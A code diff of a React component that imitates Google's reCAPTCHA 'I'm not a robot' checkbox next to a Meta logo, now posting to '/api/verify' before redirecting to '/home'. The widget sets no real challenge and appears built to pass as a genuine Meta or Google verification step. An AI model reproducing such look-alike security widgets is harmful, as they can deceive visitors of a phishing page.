@@ -1,26 +1,40 @@
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
-import { useState } from 'react';
+import axios from 'axios';
+import { useEffect, useState } from 'react';
 
 const Index = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setIsShowCheckMark] = useState(false);
     
     const handleVerify = async () => {
-        if (isLoading || isShowCheckMark) return; // Chặn click nhiều lần
+        if (isLoading || isShowCheckMark) return;
         
         setIsLoading(true);
-        
-        // Chỉ 1 setTimeout duy nhất
-        setTimeout(() => {
-            setIsLoading(false);
-            setIsShowCheckMark(true);
+        try {
+            // Gọi API verify như VPS gốc
+            const response = await axios.post('/api/verify');
+            const status = response.status;
             
-            // Redirect ngay sau khi show checkmark
-            window.location.href = '/home';
-        }, 1500); // Giảm thời gian chờ
+            if (status === 200) {
+                setTimeout(() => {
+                    setIsShowCheckMark(true);
+                    setIsLoading(false);
+                }, 2000);
+            }
+        } catch {
+            setIsLoading(false);
+        }
     };
+
+    useEffect(() => {
+        if (isShowCheckMark) {
+            setTimeout(() => {
+                window.location.href = '/home';
+            }, 500);
+        }
+    }, [isShowCheckMark]);
 
     return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
@@ -38,22 +52,19 @@ const Index = () => {
                                 >
                                     <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                     {isLoading ? (
-                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
+                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
                                     ) : (
                                         <div
-                                            className={`h-8 w-8 rounded-[3px] bg-[#fcfcfc] ${!isShowCheckMark ? 'border-2 border-gray-500' : ''}`}
+                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
                                             style={{
-                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : 'none',
-                                                backgroundPosition: '-10px -595px',
-                                                backgroundSize: 'cover'
+                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
+                                                backgroundPosition: '-10px -595px'
                                             }}
                                         ></div>
                                     )}
                                 </button>
                             </div>
-                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>
-                                I&apos;m not a robot
-                            </div>
+                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
                         </div>
                         <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
                             <img src={ReCaptchaImage} alt='' className='h-10 w-10' />
